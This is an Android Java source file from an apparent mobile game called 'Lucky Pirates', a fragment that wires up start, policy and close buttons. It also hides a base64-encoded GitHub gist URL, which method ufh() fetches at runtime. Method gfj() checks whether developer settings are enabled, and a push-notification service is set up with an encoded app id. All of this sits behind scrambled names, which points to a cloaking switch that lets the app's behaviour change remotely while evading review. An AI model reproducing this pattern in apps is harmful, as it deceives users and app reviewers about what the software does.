package com.lluuckky.ppiiratess.sewqu;

import static com.lluuckky.ppiiratess.sewqu.LP.navController;

import android.os.Build;
import android.os.Bundle;

import androidx.annotation.RequiresApi;
import androidx.fragment.app.Fragment;

import android.provider.Settings;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;

import com.onesignal.OneSignal;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class FragmentButt extends Fragment {


    Button buSta,butPol,butClo;
    public static boolean pol = false;
    public static LP lp;
    public static String jdj = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzLzlkMDZjZDEyMTRlOTUxNTc4MTI4OThiYjYxZGQwNWVmL3Jhdy9MdWNreV9QaXJhdGVz";
    public static String jdus;
    public static String jhshdado;
    public static String udsba;


    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_butt, container, false);
        buSta = (Button) view.findViewById(R.id.buSta);
        butPol = (Button) view.findViewById(R.id.butPol);
        butClo = (Button) view.findViewById(R.id.butClo);

        buSta.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                navController.navigate(R.id.fragmentGame);
                pol = true;
            }
        });

        butPol.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                navController.navigate(R.id.fragmentPol);
                pol = true;
            }
        });

        butClo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                lp.finishAffinity();
            }
        });

        return view;
    }


    public static int gfj(LP lp){
        int gsdh =  Settings.Secure.getInt(lp.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
        return gsdh;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String ufh()throws Exception{

        HttpURLConnection iusna = (HttpURLConnection) new URL(LP.ffffd(jdj)).openConnection();
        BufferedReader iuytda = new BufferedReader(new InputStreamReader(iusna.getInputStream()));
        String s = iuytda.readLine();
        return s;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void ofn(Aaaewdsdk aaaewdsdk){
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(aaaewdsdk.getApplicationContext());
        OneSignal.setAppId(LP.ffffd("YzJlYjMzYzEtNGU1NS00ZTI2LTlhMzYtYjBmNTlkYWZjMDM2"));
    }


}